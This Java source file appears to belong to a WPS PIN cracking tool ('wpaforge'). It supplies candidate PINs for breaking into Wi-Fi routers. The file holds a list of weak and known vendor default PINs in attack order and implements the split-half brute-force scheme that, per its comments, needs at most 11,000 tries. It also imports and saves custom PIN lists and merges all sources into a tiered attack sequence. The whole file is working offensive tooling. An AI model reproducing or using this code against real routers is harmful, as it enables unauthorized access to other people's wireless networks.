package io.github.wlmosv_png.wpaforge.wps;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStreamReader;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.Set;

/**
 * WPS 候选 PIN 的另两个来源：内置弱值表 + 用户导入的自定义列表。
 *
 * 为什么需要它们：厂商算法只覆盖「PIN 由 MAC 派生」的设备。剩下的设备里，
 * 相当一部分用的是出厂默认弱值或用户随手设的值 —— 这些只能靠弱值表命中；
 * 再剩下的，用户可能从别处拿到了候选，那就得能导进来。
 *
 * 纯逻辑 + 文件读写，可离线测试。
 */
public final class WpsCandidates {

    private WpsCandidates() {
    }

    public static final String FILE_NAME = "wps_pins.txt";

    /**
     * 内置弱 PIN 表（前 7 位，第 8 位校验位由 {@link WpsPins#complete} 补）。
     *
     * 顺序即尝试顺序：
     *   1. 全同数字 / 连续数字 —— 真实世界最常见的出厂值
     *   2. 常见键盘模式
     *   3. 已知厂商固定默认 PIN（同 WpsVendorPins 里的静态表）
     */
    public static List<String> builtinWeak() {
        String[] heads = {
                // 全同
                "1234567", "0000000", "1111111", "2222222", "3333333",
                "4444444", "5555555", "6666666", "7777777", "8888888",
                "9999999",
                // 连续 / 逆向
                "0123456", "9876543", "2345678", "7654321", "4567890",
                "1234560", "1023456", "8987654", "9999990", "1000000",
                // 常见模式
                "1212121", "1231231", "1122334", "1020304", "0102030",
                "1112223", "1234321", "1234123", "1122330", "1010101",
                "2000000", "3000000", "4000000", "5000000", "0000001",
                "0707070", "1234432", "1111112", "2222223", "3141592",
                // 已知厂商固定默认 PIN（7 位形态）
                "2017252", "4626484", "7622990", "6232714", "1086411",
                "3195719", "3043203", "7141225", "6817554", "9566146",
                "9571911", "4856371", "2085483", "4397768", "529417",
                "9995604", "3561153", "6795814", "3425928", "9422988",
                "9575521", "1234568", "1234000", "0001112", "2222220",
        };
        Set<String> set = new LinkedHashSet<>();
        for (String h : heads) {
            String pin = WpsPins.complete(h);
            if (pin != null) set.add(pin);
        }
        return new ArrayList<>(set);
    }

    // ---------------- 拆半攻击（11000 次必然命中） ----------------
    //
    // WPS 校验 PIN 是分两半做的：前 4 位解 M2、后 4 位解 M4。
    // 所以固定一半、穷举另一半就够了：
    //   阶段 1：后 3 位固定 000，穷举前 4 位          → 10,000 次
    //   阶段 2：前 4 位已确认，穷举后 3 位（第 8 位是校验位）→ 1,000 次
    // 合计 11,000 次，而不是 10^7。

    static String pad(int v, int width) {
        String s = Integer.toString(v);
        StringBuilder sb = new StringBuilder();
        for (int i = s.length(); i < width; i++) sb.append('0');
        return sb.append(s).toString();
    }

    /** 前 4 位 + 后 3 位 → 合法 8 位 PIN（校验位自动补）。 */
    public static String halfPin(String prefix4, String suffix3) {
        if (prefix4 == null || suffix3 == null) return null;
        if (prefix4.length() != 4 || suffix3.length() != 3) return null;
        return WpsPins.complete(prefix4 + suffix3);
    }

    /** 阶段 1 第 i 个候选（i: 0..9999），后 3 位固定 000。 */
    public static String stage1Pin(int i) {
        if (i < 0 || i > 9999) return null;
        return halfPin(pad(i, 4), "000");
    }

    /** 阶段 2 第 i 个候选（i: 0..999），前 4 位用已确认的。 */
    public static String stage2Pin(String prefix4, int i) {
        if (i < 0 || i > 999) return null;
        return halfPin(prefix4, pad(i, 3));
    }

    /** 拆半总次数上界。 */
    public static int halfTotal() {
        return 10000 + 1000;
    }

    // ---------------- 自定义列表 ----------------

    /**
     * 把一段文本解析成合法 PIN 列表。
     * 容忍：换行 / 逗号 / 空格分隔；7 位（自动补校验位）或 8 位；
     * 行内附带说明文字（只取其中的数字串）；重复项去重。
     */
    public static List<String> parseList(String text) {
        List<String> out = new ArrayList<>();
        if (text == null || text.isEmpty()) return out;
        Set<String> seen = new LinkedHashSet<>();
        StringBuilder digits = new StringBuilder();
        for (int i = 0; i <= text.length(); i++) {
            char c = i < text.length() ? text.charAt(i) : '\n';
            if (c >= '0' && c <= '9') {
                digits.append(c);
                continue;
            }
            if (digits.length() > 0) {
                String d = digits.toString();
                digits.setLength(0);
                // 长数字串里可能藏着多个 PIN：按 8 位一段切
                for (int k = 0; k + 8 <= d.length(); k += 8) {
                    String cand = d.substring(k, k + 8);
                    if (WpsPins.valid(cand)) seen.add(cand);
                }
                if (d.length() == 7) {
                    String cand = WpsPins.complete(d);
                    if (cand != null) seen.add(cand);
                } else if (d.length() == 8) {
                    if (WpsPins.valid(d)) {
                        seen.add(d);
                    } else {
                        // 8 位但校验位不对：多半是抄错了最后一位。
                        // 真 PIN 的校验位一定合法，所以按前 7 位重算更有用。
                        String cand = WpsPins.complete(d.substring(0, 7));
                        if (cand != null) seen.add(cand);
                    }
                }
            }
        }
        out.addAll(seen);
        return out;
    }

    /** 读取用户保存的列表；没有则返回空。 */
    public static List<String> loadCustom(File dir) {
        List<String> out = new ArrayList<>();
        if (dir == null) return out;
        File f = new File(dir, FILE_NAME);
        if (!f.exists() || f.length() == 0) return out;
        BufferedReader br = null;
        try {
            br = new BufferedReader(new InputStreamReader(
                    new FileInputStream(f), StandardCharsets.UTF_8));
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = br.readLine()) != null) sb.append(line).append('\n');
            return parseList(sb.toString());
        } catch (Throwable t) {
            return out;
        } finally {
            if (br != null) try {
                br.close();
            } catch (Throwable ignored) {
            }
        }
    }

    /** 保存（append=false 覆盖，true 追加）。返回保存后的总数。 */
    public static int saveCustom(File dir, String text, boolean append) {
        if (dir == null || text == null) return 0;
        if (!dir.exists()) dir.mkdirs();
        File f = new File(dir, FILE_NAME);
        List<String> merged = new ArrayList<>();
        if (append) merged.addAll(loadCustom(dir));
        Set<String> set = new LinkedHashSet<>(merged);
        set.addAll(parseList(text));

        FileOutputStream fos = null;
        try {
            fos = new FileOutputStream(f, false);
            StringBuilder sb = new StringBuilder();
            for (String p : set) sb.append(p).append('\n');
            fos.write(sb.toString().getBytes(StandardCharsets.UTF_8));
            fos.flush();
        } catch (Throwable t) {
            return merged.size();
        } finally {
            if (fos != null) try {
                fos.close();
            } catch (Throwable ignored) {
            }
        }
        return set.size();
    }

    /** 清空自定义列表。 */
    public static boolean clearCustom(File dir) {
        if (dir == null) return false;
        File f = new File(dir, FILE_NAME);
        try {
            return !f.exists() || f.delete();
        } catch (Throwable t) {
            return false;
        }
    }

    /** 一次性把三个来源拼成交互顺序：厂商算法 → 弱值表 → 自定义 → （可选）完整枚举。 */
    public static List<WpsVendorPins.Candidate> tiered(String bssid, String sn,
                                                      File dir, boolean includeWeak,
                                                      boolean includeCustom) {
        List<WpsVendorPins.Candidate> out = new ArrayList<>();
        Set<String> seen = new LinkedHashSet<>();
        for (WpsVendorPins.Candidate c : WpsVendorPins.suggest(bssid, sn)) {
            if (seen.add(c.pin)) out.add(c);
        }
        if (includeWeak) {
            for (String p : builtinWeak()) {
                if (seen.add(p)) out.add(new WpsVendorPins.Candidate(p, "weak", false));
            }
        }
        if (includeCustom) {
            for (String p : loadCustom(dir)) {
                if (seen.add(p)) out.add(new WpsVendorPins.Candidate(p, "custom", false));
            }
        }
        return out;
    }
}
